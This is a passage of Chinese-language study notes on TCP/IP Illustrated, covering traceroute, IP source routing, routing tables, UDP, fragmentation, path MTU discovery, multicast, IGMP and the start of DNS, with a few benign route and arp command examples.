<li>Traceroute程序可以让我们看到IP数据报从一台主机传到另一台主机所经过的路由</li>
<li>Traceroute程序还可以让我们使用IP源路由选项</li>
</ul>
<h2><span id="traceroute和ip路径记录选项的比较">Traceroute和IP路径记录选项的比较</span></h2><p>我们描述了IP记录路由选项（RR）。为什么不使用这个选项而另外开发一个新的应用程序？有三个方面的原因。</p>
<ul>
<li>首先，原先并不是所有的路由器都支持记录路由选项，因此该选项在某些路径上不能使用（Traceroute程序不需要中间路由器具备任何特殊的或可选的功能）</li>
<li>其次，记录路由一般是单向的选项。发送端设置了该选项，那么接收端不得不从收到的IP首部中提取所有的信息，然后全部返回给发送端.大多数Ping服务器的实现（内核中的ICMP回显应答功能）把接收到的RR清单返回，但是这样使得记录下来的IP地址翻了一番（一来一回）。</li>
<li>最后一个原因也是最主要的原因是，IP首部中留给选项的空间有限，不能存放当前大多数的路径</li>
</ul>
<h2><span id="traceroute程序的操作">Traceroute程序的操作</span></h2><ul>
<li>Traceroute程序使用ICMP报文和IP首部中的TTL字段（生存周期）。TTL字段是由发送端初始设置一个8bit字段。推荐的初始值由分配数字RFC指定，当前值为64.较老版本的系统经常初始化为15或32.发送ICMP回显应答时经常把TTL设为最大值255</li>
<li>每个处理数据报的路由器都需要把TTL的值减1或减去数据报在路由器中停留的秒数。由于大多数的路由器转发数据报的时延都小于1秒钟，因此TTL最终成为一个跳站的计数器，所经过的每个路由器都将其值减1</li>
<li>当路由器收到一份IP数据报，如果其TTL字段是0或1，则路由器不转发该数据报（接收到这种数据报的目的主机可以将它交给应用程序，这是因为不需要转发该数据报。但是在通常情况下，系统不应该接收TTL字段为0的数据报）。相反，路由器将该数据报丢弃，并给信源机发一份ICMP“超时”信息。Traceroute程序的关键在于包含这份ICMP信息的IP报文的信源地址是该路由器的IP地址</li>
<li>Traceroute程序发送一份UDP数据报给目的主机，但它选择一个不可能的值作为UDP端口号（大于3000），使目的主机的UDP模块产生一份“端口不可达”错误的ICMP报文。这样，Traceroute程序所要做的就是区分接收到的ICMP报文是超时还是端口不可达，以判断什么时候结束。</li>
</ul>
<h2><span id="ip源选路选项">IP源选路选项</span></h2><p>源站选项（source routing）的思想是由发送者指定路由，它可以采用以下两种形式：</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/uknow.jpg" alt=""></p>
<ul>
<li>严格的源路由选择。发送端指明IP数据报所必须采用的确切路由。如果一个路由器发现源路由所指定的下一个路由器不在其直接连接的网络上，那么它就返回一个“源路路由失败”的ICMP差错报文</li>
<li>宽松的源站选路，发送端指明了一个数据报经过的IP地址清单，但是数据报在清单上指明的任意两个地址之间可以通过其他路由器</li>
<li>这个格式与记录路由选项格式基本一致。不同之处是，对于源站选路，我们必须在发送IP数据报前填充IP地址清单；而对于记录路由选项，我们需要为IP地址清单分配并清空一些空间，并让路由器填充该清单中各项。同时，对于源站选路，只要为所需要的IP地址数分配空间并进行初始化，通常其数量小于9.而对于记录路由选项来说，必须尽可能地分配空间，以达到9个地址</li>
<li>对于宽松的源站来说，code字段的值是0x83；而对于严格的源站选路，其值为0x89.len和ptr字段与IP首部中的记录路由选项的一般格式是一样的</li>
</ul>
<h2><span id="ip源站选路的操作机制">IP源站选路的操作机制</span></h2><p>源站路由选项的实际称呼为“源站及记录路由”（对于宽松的源站选路和严格的源路选路，分别用LSRR和SSRR表示），这是因为在数据报沿路由发送过程中，对IP地址清单进行了更新。下面是其运行过程：</p>
<ul>
<li>发送主机从应用程序接收源站路由清单，将第1个表项去掉（它是数据报的最终目的地址），将剩余的项移到1个项中，并将原来的目的地址作为清单的最后一项。指针仍然指向清单的第1项（即，指针的值为4）</li>
<li>每个处理数据报的路由器检查其是否为数据报的最终地址。如果不是，则正常转发数据报（在这种情况下，必须指明宽松源站选路，否则就不能接收到该数据报）</li>
<li>如果该路由器是最终目的，且指针不大于路径的长度，那么（1）由ptr所指定的清单中的下一个地址就是数据报的最终目的地址；（2）由外接口响应的IP地址取代刚才使用的源地址；（4）指针加4</li>
<li>Host Requirements RFC指明，TCP客户必须能指明源站选路，同时，TCP服务器必须能够接收源站选路，并且对于该TCP连接的所有报文段都能采用反向路由。如果TCP服务器下面接收到一个不同的源站选路，那么新的源路路由将取代旧的源路路由</li>
</ul>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/uknow1.jpg" alt=""></p>
<h1><span id="ip选路">IP选路</span></h1><ul>
<li>选路是IP最重要的功能之一</li>
<li>路由守护程序（daemon），通常这是一个用户进程</li>
<li>在Unix系统中，大多数普通的守护程序都是路由程序和网关程序</li>
<li>路由表经常被IP访问，但是它被路由守护程序更新的频度却要低得多</li>
<li>当接收到ICMP重定向报文时，路由表也要被更新</li>
<li><p>用netstat命令来显示路由表</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170421202212.jpg" alt=""></p>
</li>
</ul>
<h2><span id="选路的原理">选路的原理</span></h2><p>IP搜索路由表的几个步骤：</p>
<ul>
<li>搜索匹配的主机地址</li>
<li>搜索匹配的网络地址</li>
<li>搜索默认表项（默认表项一般在路由表中被指定为一个网络表项，其网络号为0）</li>
<li>CISCO的选路策略（1.明细策略路由 2.明细路由 3.策略默认路由 4.默认路由）</li>
<li>IP执行选路机制，而路由守护程序则一般提供选路策略</li>
</ul>
<h2><span id="初始化路由表">初始化路由表</span></h2><ul>
<li>每当初始化一个接口时（通常是用ifconfig命令设置接口地址），就为接口自动创建一个直接路由。对于点对点链路和环回接口来说，路由是到达主机（例如，设置H标志）。对于广播接口来说，如以太网，路由是到达网络</li>
<li>到达主机或网络的路由如果不是直接相连的，那么就必须加入路由表</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">route add default sun 1</span><br><span class="line">route add slip bsdi 1</span><br><span class="line">route add 1.1.1.0 mask 255.255.255.0 1.1.1.1</span><br></pre></td></tr></table></figure>
<ul>
<li>第三个参数（defalut和slip）代表目的端，第四个参数代表网关（路由器），最后一个参数代表路由的度量（metric）.route命令在度量值大于0时要为该路由设置G标志，否则，当耗费值为0时就不设置G标志</li>
</ul>
<h2><span id="转发或不转发">转发或不转发</span></h2><ul>
<li>一般都假定主机不转发IP数据报，除非对它们进行特殊配置而作为路由器使用</li>
<li>大多数伯克利派出来的系统都有一个内核变量ipforwarding</li>
<li>SumOS 4.1.x允许该变量可以有三个不同的值：-1表示始终不转发并且始终不改变它的值；0表示默认条件下不转发，但是当打开两个或更多个接口时就把值设为1；1表示始终转发。Solaris 2.x把这个值改为0（始终不转发）’1（始终转发）和2（在打开两个或更多个接口是才转发）</li>
<li>较早版本的4.2BSD主机在默认条件下可以转发数据报，这给没有进行正确配置的系统带来了许多问题。这就是内核选项为什么要设成默认的“始终不转发”的原因，除非系统管理员进行特殊设置</li>
</ul>
<h2><span id="icmp重定向差错">ICMP重定向差错</span></h2><ul>
<li>我们假定主机发送一份IP数据报给R1.这种选路决策经常发生，因为R1是该主机的默认路由</li>
<li>R1收到数据报并检查它的路由表，发现R2是发送数据报的下一站。当它把数据报发送给R2时，R1检测到它正在发送的接口与数据报达到接口是相同的（即主机和两个路由器所在的LAN）。这样就给路由器发送重定向报文给原始发送端提供了线索</li>
<li>R1发送一份ICMP重定向报文给主机，告诉它以后把数据报发送给R2而不是R1</li>
</ul>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170422232852.jpg" alt=""></p>
<h1><span id="udp用户数据报协议">UDP：用户数据报协议</span></h1><h2><span id="udp介绍">UDP介绍</span></h2><ul>
<li>UDP是一个简单的面向数据报的运输层协议：进程的每个输出操作都正好产生一个UDP数据报，并组装成一份待发送的IP数据包</li>
<li>这与面向流字符的协议不同，如TCP，应用程序产生的全体数据与真正发送的单个IP数据报可能没什么联系</li>
<li>UDP不提供可靠性：它把应用程序传给IP层的数据发送出去，但是并不保证它们能到达目的地</li>
<li>应用程序必须关心IP数据报的长度。如果它超过网络的MTU，那么就要对IP数据报进行分片</li>
</ul>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/211857142503378.png" alt=""></p>
<h2><span id="udp三大典型运用">UDP三大典型运用</span></h2><h3><span id="查询类dns">查询类：DNS</span></h3><ul>
<li>没有TCP三次握手包过程，快</li>
<li>多个DNS同时查询</li>
</ul>
<h3><span id="数据传输tftp">数据传输：TFTP</span></h3><ul>
<li>停止等待协议，慢（需运用层确定数据）</li>
<li>适合无盘工作站</li>
</ul>
<h3><span id="语言视频流">语言视频流</span></h3><ul>
<li>支持广播和组播</li>
<li>支持丢包，保障效率</li>
</ul>
<h2><span id="udp首部">UDP首部</span></h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/211907360933802.png" alt=""></p>
<ul>
<li>端口号表示发送进程和接收进程</li>
<li>TCP端口号与UDP端口号是相互独立的。（rsh和syslog=514）</li>
<li>尽管相互独立，如果TCP和UDP同时提供某种知名服务，两个协议通常选择相同的端口号。这纯粹是为了使用方便，而不是协议本事的要求（dns）</li>
<li>UDP长度字段指的是UDP首部和UDP数据的字节长度。该字段的最小值为8字节</li>
</ul>
<h2><span id="udp检验和">UDP检验和</span></h2><ul>
<li>UDP检验和覆盖UDP首部和UDP数据</li>
<li>IP首部的检验和，它只覆盖IP的首部</li>
<li>UDP的检验和是可选的，而TCP的检验和是必需的</li>
<li>IP计算检验和和UDP计算检验和之间存在不同的地方。首先，UDP数据报的长度可以为奇数字节，但检验和算法是把若干个16bit字相加。解决方法是必要时在最后增加填充字节0，这只是为了检验和的计算（也就是说，可能增加的填充字节不被传送）</li>
<li>UDP数据报和TCP段都包含一个12字节长的伪首部，它是为了计算检验和而设置的。伪首部包含IP首部一些字段。其目的是让UDP两次检查数据是否已经正确到达目的地（例如，IP没有接受地址不是本主机的数据报，以及IP没有把应传给另一高层的数据报传给UDP）</li>
</ul>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/211955147184376.png" alt=""></p>
<h2><span id="tcpdump输出">tcpdump输出</span></h2><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE2017042317114.jpg" alt=""></p>
<ul>
<li>三个系统有两个打开了UDP检验和选项</li>
<li>送出的数据报与收到的数据报具有相同的检验和值（第3和第4行，第5和第6行）。从图11-3可以看出，两个IP地址进行了交换，正如两个端口号一样。伪首部和UDP首部中的其他字段都是相同的，就想数据回显一样。这再次表明UDP检验和（事实上，TCP|IP协议簇中所有的检验和）是简单的16bit和。它们检测不出交换两个16bit的差错</li>
</ul>
<h2><span id="一个简单的例子">一个简单的例子</span></h2><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170423172522.jpg" alt=""></p>
<ul>
<li>在发送第一份数据报之前，发送端和接收端之间没有任何通信</li>
<li>当收到数据时，接收端没有任何确认。在这个例子中，发送端并不知道零一端是否已经收到这些数据报</li>
<li>每次运行程序时，源端的UDP端口号都发生变化。第一次是1108，然后是1110.客户程序使用ephemeral端口号一般在1024~5000之间</li>
</ul>
<h2><span id="ip分片">IP分片</span></h2><ul>
<li>IP把MTU与数据报长度进行比较</li>
<li>如果需要则进行分片。分片可以发生在原始发送端主机上，也可以发送在中间路由器上。</li>
<li>把一份IP数据报分片以后，只有到达目的地才进行重新组装（FR fragment）</li>
<li>重新组装由目的端的IP层来完成，其目的是使分片和重新组装过程对运输层（TCP和UDP）是透明的</li>
<li>已经分片过的数据报有可能会再次进行分片（可能不止一次）</li>
<li>当IP数据报被分片后，每一片都成为一个分组，具有自己的IP首部中有足够的信息让接收端能正确组装这些数据报片</li>
<li>尽管IP分片过程看起来是透明的，但有一点让人不想使用它：即使只丢失一片数据也要重传整个数据报</li>
<li>IP层本身没有超时重传的机制–由更高层来负责超时和重传（TCP有超市和重传机制，但UDP没有。一些UDP应用程序本身也执行超时和重传）。当来自TCP报文段的某一片丢失后，TCP在超时后会重发整个TCP报文段，该报文段对应于一份IP数据报。没有办法只能重传数据报中的一个数据报片</li>
<li>如果对数据报分片的是中间路由器，而不是启事端系统，那么起始端系统就无法知道数据报是如何被分片的。就这个原因，要经常避免分片</li>
</ul>
<h3><span id="ip分片注意事项">IP分片：注意事项</span></h3><ul>
<li>在分片时，除最后一片外，其他每一片中的数据部分（除IP首部外的其余部分）必须是8字节的整数倍</li>
<li>IP首部被复制到各个片中。但是，端口号在UDP首部，只能在第一片中被发现</li>
<li>需要解释几个术语：IP数据报是指IP层端到端的传输单元（在分片之前和重新组装之后），分组是指在IP层和链路层之间的数据单元，一个分组可以是一个完整的IP数据报，也可以是IP数据报的一个分片</li>
</ul>
<h2><span id="icmp不可达差错需要分片">ICMP不可达差错（需要分片）</span></h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/212127065468647.png" alt=""></p>
<ul>
<li>发生ICMP不可达差错的另一种情况是，当路由器收到一份需要分片的数据报，而在IP首部又设置了不分片(DF的标志比特。如果某个程序需要判断到目的端的路途中最小MTU是多少–称作路径MTU发现机制，那么这个差错就可以被该程序使用</li>
<li>如果路由器没有提供这种新的ICMP差错报文格式，那么下一站的MTU就设为0</li>
</ul>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170424210136.jpg" alt=""></p>
<ul>
<li>在点到点的链路中，不要求两个方向的MTU为相同值</li>
<li>在主机sun上运行tcpdump，观察SLIP链路，看什么时候发生分片。开始没有观察到分片，一切都很正常知道ping分组的数据长度从500增加到600字节。可以看到接收到的回显请求（仍然没有分片），但不见回显应答</li>
<li>Ping的时候DF置位（echo设置DF位，echo-reply也会设置DF位）</li>
</ul>
<h2><span id="用traceroute确定路径mtu">用Traceroute确定路径MTU</span></h2><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170424205607.jpg" alt=""></p>
<ul>
<li>MTU值的个数是有限的，因此在我们的程序中有些由近似值构成的表，取下一个最小的MTU值来发送</li>
<li>上面的测试中间设备不回送吓一跳的MTU，下面的测试回送了下一跳的MTU</li>
</ul>
<h2><span id="采用udp的路径mtu发现">采用UDP的路径MTU发现</span></h2><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170424205406.jpg" alt=""></p>
<ul>
<li>Solaris发送650字节的udp包，并且DF被置位</li>
<li>被bsdi丢弃，但是不回送MTU值</li>
<li>Solaris自以为是的对数据包进行分片（552 106两个片）</li>
</ul>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170424205651.jpg" alt=""><br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170424205746.jpg" alt=""></p>
<ul>
<li>Solaris自以为是的对数据报进行分片（552 106两个片）造成不优化的再次分片</li>
<li>最好的解决方式是让bsdi回送MTU，Solaris根据这个MTU采取最优化的分片</li>
</ul>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170424205832.jpg" alt=""></p>
<h2><span id="udp和arp之间的交互作用">UDP和ARP之间的交互作用</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bsdi % arp -a验证ARP高速缓存是空的</span><br><span class="line">bsdi % sock -u -i -l -w8192 svr4 discard</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170424205918.jpg" alt=""></p>
<ul>
<li>1.在第一个ARP应答返回以前，总共产生了6个ARP请求</li>
<li>2.在接收第一个ARP应答时（第7行），只发送最后一个数据报片（第9行）</li>
<li>3.在大多数的实现中，在等待一个ARP应答时，只将最后一个报文发送给特定目的主机</li>
<li>4.另一个无法解释的不正常的现象是，svr4发回7个，而不是6个ARP应答</li>
<li>5.这里我们没有看到ICMP消息的原因有两个。首先，大多数从Berkeley派生的实现从不产生该差错！这些实现会设置定时器，也会在定时器溢出时将数据报片丢弃，但是不生成ICMP差错</li>
<li>6.第二，并未接收到包含UDP首部的偏移量为0的第一个数据报片（这是被ARP所丢弃的5个报文的第一个）除非接收到第一个数据报片，否则并不要求任何实现产生ICMP差错</li>
</ul>
<h2><span id="最大udp数据报长度">最大UDP数据报长度</span></h2><ul>
<li>IP数据报的最大长度是65535字节，这是由IP首部16比特总长度字段所限制的</li>
<li>我们将遇到两个限制因素，第一，应用程序可能会收到其程序接口的限制。Socket API提供了一个可供应用程序调用的函数，以设置接收和发送缓存的长度。对于UDP socket，这个长度与应用程序可以读写的最大UDP数据报的长度直接相关。现在的大部分系统都默认提供了可读写大于8192字节的UDP数据报（使用这个默认值是因为8192是NFS读写用户数据数的默认值）</li>
<li>第二个限制来自于TCP|IP的内核实现。可能存在一些实现特性（或差错），使IP数据报长度小于65535字节</li>
<li>在SunOS4.1.3下使用环回接口的最大IP数据报长度是32767字节。比它大的值都会发生差错。但是从BSD/386到SunOS4.1.3的情况下，Sun所能接收到最大IP数据报长度为32786字节（即32758字节用户数据）。在Solaris2.2下使用环回接口，最大可收发IP数据报长度为65535字节。从Solaris2.2到AIX3.2.2,发送的最大IP数据报长度可以是65535字节。很显然，这个限制和源端和目的端的实现有关</li>
<li>要求主机必须能够接收最短为576字节的IP数据报，在许多的UDP应用程序的设计中，其应用数据被限制成512字节或更小，因此比这个限制值小</li>
</ul>
<h2><span id="icmp源站抑制差错">ICMP源站抑制差错</span></h2><p>当一个系统（路由器或主机）接收数据报的速度比其处理速度快时，可能产生这个差错。</p>
<p>注意：“可能”产生这个差错。即使一个系统已经没有缓存并丢弃数据报，也不要求它一定要发送源站抑制报文。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/212155080782897.png" alt=""></p>
<h2><span id="udp服务器的设计">UDP服务器的设计</span></h2><p>对于服务器来说，它启动后处于休眠状态，等待客户请求的到来。对于UDP来说，当客户数据报到达时，服务器苏醒过来，数据报中可能包含来自客户的某种形式的请求消息。</p>
<ul>
<li><p>（1）客户IP地址及端口号<br>IP首部包含源端和目的端IP地址，UDP首部包含了源端和目的端的UDP端口号。当一个应用程序接收到UDP数据报时，操作系统必须告诉它是谁发送了这份消息，即源IP地址和端口号。这个特性允许一个交互UDP服务器对多个客户进行处理。给每个发送请求的客户发回应答。</p>
</li>
<li><p>（2）目的IP地址<br>一些应用程序需要知道数据报是发送给谁的，即目的IP地址。这要求操作系统从接收到的UDP数据报中将目的IP地址交给应用程序。</p>
</li>
<li><p>（3）UDP输入队列<br>大多数UDP服务器是交互服务器。这意味着，单个服务器进程对单个UDP端口上（服务器上的名知端口）的所有客户请求进行处理。</p>
</li>
</ul>
<p>通常程序所使用的每个UDP端口都与一个有限大小的输入队列相联系。来自不同客户的差不多同时到达的请求将由UDP自动排队。接收到的UDP数据报以其接收顺序交给应用程序</p>
<p>排队溢出造成内核中的UDP模块丢弃数据报的可能性是存在的。</p>
<p>1）应用程序并不知道其输入队列何时溢出。只是由UDP对超出数据报进行丢弃处理。</p>
<p>2）没有发回任何信息告诉客户其数据报被丢弃。</p>
<ul>
<li>（4）限制本地IP地址<br>大多数UDP服务器在创建UDP端点时都使其本地IP地址具有通配符(wildcard)的特点。表明进入的UDP数据报如果其目的地为服务器端口，那么在任何本地接口均可接收到它。</li>
</ul>
<p>另一方面，当服务器创建端点时，它可以把其中一个主机本地IP地址包括广播地址指定为端点的本地IP地址。只有当目的IP地址与指定的地址相匹配时，进入的UDP数据报才能被送到这个端点。</p>
<ul>
<li>（5）限制远端IP地址</li>
</ul>
<p>大多数系统都允许UDP端点对远端地址进行限制，即端点将只能接收特定IP地址和端口号的UDP数据报。</p>
<ul>
<li>（6）每个端口有多个接收者</li>
</ul>
<p>大多数系统在某一时刻只允许一个程序端点与某个本地IP地址及UDP端口号相关联。当目的地为该IP地址及端口号的UDP数据报到达主机时，就复制一份传给该端点。</p>
<p>然而，在一个支持多播的系统上，多个端点可以使用同一个IP地址和UDP端口号。</p>
<p>当UDP数据报到达的目的IP地址为广播地址或多播地址，而且在目的IP地址和端口号处有多个端点时，就向每个端点传送一份数据报的复制。如果UDP数据报到达的是一个单播地址，那么只向其中一个端点传送一份数据报的复制。选择哪个端点传送数据取决于各个不同的系统实现。</p>
<h1><span id="广播与多播">广播与多播</span></h1><ul>
<li>三种IP地址：单播地址、广播地址和多播地址。</li>
<li>广播和多播仅应用于UDP，它们对需要将报文同时传往多个接收者的应用来说十分重要</li>
<li>TCP是一个面向连接的协议，它意味着分别运行于两主机（由IP地址确定）内的两进程（由端口号确定）间存在一条连接</li>
<li>有时一个主机要向网上的所有其他主机发送帧，这就是广播。通过ARP和RARP可以看到这一过程</li>
<li>多播处于单播和广播之间：帧仅传送给属于多播组的多个主机</li>
</ul>
<h2><span id="协议栈各层对收到帧的过滤过程">协议栈各层对收到帧的过滤过程</span></h2><ul>
<li>网卡查看帧，确定是否接收该帧，若接收后将它传递给设备驱动程序。网卡仅接收目的地址为网卡物理地址或广播地址的帧。如果多接口设置为混合模式，能接收每个帧的一个复制；</li>
<li>设备驱动程序将进行另外的帧过滤：<br>1）帧类型中必须指定要使用的协议；<br>2）进行多播过滤来检测该主机是否属于多播地址说的多播组</li>
<li>设备驱动程序将数据帧传递给IP层（如果为IP类型的数据报）。IP根据IP地址中源地址和目的地址进行更多的过滤检测。如果正常，将数据报传递给下一层；</li>
<li>UDP根据IP层传递数据中目的端口来进行过滤。<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170425212507.jpg" alt=""></li>
</ul>
<h2><span id="广播">广播</span></h2><ul>
<li>受限的广播255.255.255.255</li>
<li>指向网络的广播10.255.255.255 192.168.1.255</li>
<li>指向子网的广播10.11.255.10.1.255.255</li>
<li>指向所有子网的广播10.255.255.255</li>
<li>主机处理的地址192.168.255.255（cisco路由器支持）</li>
<li>路由器支持255.255.255.255，主机不支持（当主机处理）</li>
</ul>
<h2><span id="多播">多播</span></h2><p>IP多播提供两类服务：</p>
<ul>
<li>向多个目的地址发送数据；</li>
<li>客户对服务器的请求。</li>
</ul>
<h3><span id="多播组地址">多播组地址</span></h3><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170425215329.jpg" alt=""></p>
<ul>
<li>多播组地址包括为1110的最高4bit和多播组号。它们通常可表示为点分十进制数，范围从224.0.0.0到239.255.255.255</li>
<li>能够接收发往一个特定多播组地址数据的主机集合称为主机组（host group）。一个主机组可以跨越多个网络。主机组中成员可随机加入或离开主机组，主机组中对主机的数量没有限制，同时不属于某一个主机组的主机可以向该组发送信息</li>
<li>一些多播组地址被IANA确定为知名地址。它们也被当做用久主机组，这和TCP及UDP中的熟知端口相似</li>
</ul>
<h3><span id="多播组地址到以太网地址的转换">多播组地址到以太网地址的转换</span></h3><p><img src="http://images2015.cnblogs.com/blog/680022/201604/680022-20160406160845156-123233528.png" alt=""></p>
<ul>
<li>IANA拥有一个以太网地址块，即高位24bit为00:00:5e（十六进制表示），这意味着该地址块所拥有的地址范围从00:00:5e:00:00:00到00:00:5e:ff:ff:ff。IANA将其中的一半（高位的第四个字节的高四位分成0~7和8~f两半，这样是分成了整体的一半）分配为多播地址。为了指明一个多播地址，任何一个以太网地址的首字节必须是01，这意味着与IP多播相对应的以太网地址范围从01:00:5e:00:00:00到01:00:5e:7f:ff:ff（7f这个就是一半）。</li>
<li>由于7的二进制是0111，所以高位0是确定的了，因此以太网地址的前三个字节01:00:5e和下一位0确定了25bit。剩下的23bit和IP地址的低23bit相同。这样D类地址中高9bit中的低5bit就被忽略了。 –这样带来一个问题，5bit被忽略，那么表示会有32（2的5次方）个不同的多播号映射成了相同的以太网地址…比如：224.128.64.32和224.0.64.32都映射为同一以太网地址01:00:5e:00:40:20。</li>
<li>既然地址映射是不唯一的，那么设备驱动程序或IP层就必须对数据报进行过滤。因为网卡可能接收到主机不想接收的多播数据帧。另外，如果网卡不提供足够的多播数据帧过滤功能，设备驱动程序就必须接收所有多播数据帧，然后对它们进行过滤。</li>
</ul>
<h1><span id="igmpinternet组管理协议">IGMP：Internet组管理协议</span></h1><p><img src="http://images2015.cnblogs.com/blog/680022/201604/680022-20160407122404140-1999656219.png" alt=""></p>
<ul>
<li>IGMP协议让一个物理网络上的所有系统知道主机当前所在的多播组。多播路由器需要这些信息以便知道多播数据报应该向哪些接口转发。 </li>
<li>正如ICMP一样，IGMP也被当作IP层的一部分。IGMP报文通过IP数据报进行传输。不像我们已经见到的其他协议，IGMP有固定的报文长度，没有可选数据</li>
</ul>
<h2><span id="igmp报文">IGMP报文</span></h2><p><img src="http://images2015.cnblogs.com/blog/680022/201604/680022-20160407122411187-535768858.png" alt=""></p>
<ul>
<li>这是版本为1的IGMP。IGMP类型为1说明是由多播路由器发出的查询报文，为2说明是主机发出的报告报文（多播路由器发出的是查询类型的报文，网络上的主机发送的是报告类型的报文）。检验和的计算和IGMP协议相同，同样覆盖首部和数据部分。</li>
<li>组地址为D类IP地址。在查询报文中组地址设置为0，在报告报文中组地址为要参加的组地址。</li>
</ul>
<h2><span id="igmp报告和查询">IGMP报告和查询</span></h2><p>多播路由器使用IGMP报文来记录与该路由器相连网络中组成员的变化情况。使用规则如下：</p>
<ul>
<li>当第一个进程加入一个组时，主机就发送一个IGMP报告。如果一个主机的多个进程加入同一组，只发送一个IGMP报告。这个报告被发送到进程加入组所在的同一接口上。</li>
<li>进程离开一个组时，主机不发送IGMP报告，即便是组中的最后一个进程离开。主机知道在确定的组中已不再有组成员后，在随后收到的IGMP查询中就不再发送报告报文。</li>
<li>多播路由器定时发送IGMP查询来了解是否还有任何主机包含有属于多播组的进程。多播路由器必须向每个接口发送一个IGMP查询。因为路由器希望主机对它加入的每个多播组均发回一个报告，因此IGMP查询报文中的组地址被设置为0。</li>
<li>主机通过发送IGMP报告来响应一个IGMP查询，对每个至少还包含一个进程的组均要发回IGMP报告。</li>
</ul>
<p>使用这些查询和报告报文，多播路由器对每个接口保持一个表，表中记录接口上至少还包含一个主机的多播组（多播路由只关心是不是至少有一个，有一个就得转发）。当路由器收到要转发的多播数据报时，它只将该数据报转发到（使用相应的多播链路层地址）还拥有属于那个组主机的接口上。</p>
<p>如图：查询和报告的报文。显示了两个IGMP报文，一个是主机发送的报告，另一个是路由器发送的查询。该路由器正在要求那个接口上的每个主机说明它加入的每个多播组</p>
<p><img src="http://images2015.cnblogs.com/blog/680022/201604/680022-20160407123400375-1952921020.png" alt=""></p>
<h2><span id="实现细节">实现细节</span></h2><p>实现IGMP的几个细节：</p>
<ul>
<li>当一个主机首次发送IGMP报告（当第一个进程加入一个多播组）时，并不保证该报告被可靠接收（因为使用的是IP交付服务）。下一个报告将在间隔一段时间后发送。这个时间间隔由主机在 0 ~ 1 0秒的范围内随机选择。 </li>
<li>当一个主机收到一个从路由器发出的查询后，并不立即响应，而是经过一定的时间间隔后才发出一些响应s（一个主机可能不止一个多播组，有几个就要发送几个响应）。</li>
</ul>
<h1><span id="dns域名系统">DNS：域名系统</span></h1><h2><span id="引言">引言</span></h2><p>域名系统（DNS）是一种用于TCP/IP应用程序的分布式数据库，它提供主机名字和IP地址之间的转换及有关电子邮件的选路信息。</p>
<h2><span id="dns基础">DNS基础</span></h2><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170501144713.jpg" alt=""></p>
<ul>
<li>DNS的名字空间和Unix的文件系统相似，也具有层次结构</li>
<li>每个结点（图14-1中的圆圈）有一个至多63个字符长</li>
<li>以点“.”结尾的域名称为绝对域名或完全合格的域名FQDN(Full Qualified Domain Name)</li>
<li><p>顶级域名被分为三个部分：<br>  1）arpa是一个用做地址到名字转换的特殊域<br>  2）7个3字符长的普通域，也称组织域<br>  3）所有2字符长的域均是基于ISO3166中定义的国家代码，这些域称为国家域，或地理域<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170501144946.jpg" alt=""></p>
</li>
<li><p>一个独立管理的DNS子树称为一个区域（zone）</p>
</li>
<li>DNS的一个基本特征是使用超高速缓存。即当一个名字服务器收到有关映射的信息（主机名字到IP地址）时，它会将该信息存放在高速缓存中。这样若以后遇到相同的映射请求，就能直接使用缓存中的结果而不需通过其他服务器查询</li>
</ul>
<h2><span id="dns的报文格式">DNS的报文格式</span></h2><p>DNS定义了一个用于查询和响应的报文格式。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170501145012.jpg" alt=""></p>
<ul>
<li>这个报文由12字节长的首部和4个长度可变的字段组成</li>
<li>标识字段由客户程序设置并有服务器返回结果。客户程序通过它来确定响应与查询是否匹配</li>
